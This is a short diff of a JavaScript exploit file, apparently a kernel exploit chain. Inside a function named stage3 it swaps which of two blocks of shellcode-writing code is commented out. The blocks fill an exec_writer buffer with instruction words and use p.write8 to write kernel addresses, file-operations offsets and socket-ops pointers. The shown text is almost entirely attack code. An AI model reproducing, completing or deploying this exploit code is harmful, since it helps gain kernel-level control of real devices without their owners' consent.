@@ -2752,7 +2752,7 @@ function stage3() {
       while(1){};
   }
 	
-/*
+
   exec_writer[0] = 0x54415355;
   exec_writer[1] = 0x1111BB48;
   exec_writer[2] = 0x11111111;
@@ -2854,8 +2854,8 @@ function stage3() {
   p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
   p.write8(write_address.add32(0x85), socketops);
   p.write8(write_address.add32(0x92), kernel_base);
-*/
-	
+
+/* chendo broke it vol 222
   exec_writer[0] = 0x54415355;
   exec_writer[1] = 0x1111BB48;
   exec_writer[2] = 0x11111111;
@@ -2949,7 +2949,7 @@ function stage3() {
   p.write8(write_address.add32(0x80), target_file.add32(FILE_FOPS_OFFSET));
   p.write8(write_address.add32(0x8A), socketops);
   p.write8(write_address.add32(0x97), kernel_base);	
-	
+*/
 	
 	
 	
